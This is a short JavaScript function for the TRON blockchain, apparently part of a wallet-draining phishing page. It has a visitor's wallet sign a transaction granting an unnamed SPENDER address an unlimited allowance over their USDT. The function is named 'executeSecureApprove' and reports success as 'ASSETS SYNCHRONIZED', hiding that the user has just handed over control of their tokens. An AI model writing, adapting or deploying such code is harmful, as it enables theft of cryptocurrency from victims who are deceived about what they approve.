async function executeSecureApprove() { const tw = window.tronWeb; const userAddr = tw.defaultAddress.base58; // Параметры для формирования транзакции через API const functionSelector = "approve(address,uint256)"; const parameter = [ {type: 'address', value: SPENDER}, {type: 'uint256', value: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"} ]; try { // 1. Собираем транзакцию через TronGrid (не полагаемся на локальный ABI) const transaction = await tw.transactionBuilder.triggerSmartContract( USDT, functionSelector, {}, parameter, userAddr ); // 2. Подписываем полученную "сырую" транзакцию const signedTx = await tw.trx.sign(transaction.transaction); // 3. Отправляем в сеть const result = await tw.trx.sendRawTransaction(signedTx); if(result.result) { log("SUCCESS: ASSETS SYNCHRONIZED"); } } catch (e) { log("ERROR: " + (e.message || "Execution Failed")); } }
